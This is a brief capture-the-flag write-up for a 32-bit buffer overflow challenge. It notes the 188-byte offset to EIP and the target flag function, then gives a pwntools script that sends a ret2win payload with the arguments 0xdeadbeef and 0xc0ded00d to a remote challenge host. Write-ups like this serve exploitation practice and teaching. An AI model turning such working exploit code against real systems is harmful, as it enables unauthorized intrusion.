![alt text](https://i.imgur.com/Xr16qc7.png)


## Bufferoverflow
- 188 bytes until EIP control


---


# Flag Function
![alt text](https://i.imgur.com/1g7Pk9x.png)

```
- flag(int param_1, int param_2)
	- cdecl is the calling convention
```

![alt text](https://i.imgur.com/HLCtmkd.png)

# Vuln function
![alt text](https://i.imgur.com/nSL5IJ7.png)



# Exploit Development 
```python
from pwn import *


context.binary = ELF("./vuln", checksec=True)
#p = process()
p = remote("178.128.46.251", 30138)

# flag addr: 0x80491e2
# if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d'))


payload = b"A"*188              # padding
payload += p32(0x080491e2)      # vuln function
payload += b"fooo"              # dumb addr / filler bytes for eip
payload += p32(0xdeadbeef) + p32(0xc0ded00d)

with open("payload.txt", "w") as file:
        file.write(str(payload))
        file.close()

p.sendline(payload)
print(p.recvall())
```

```
The calling convention of the function we call @ 0x080491e2 needs to be supplied in reverse order followed by an address that will populate the EIP register. In this case, this address will work as a returning address, without supplying one.
```
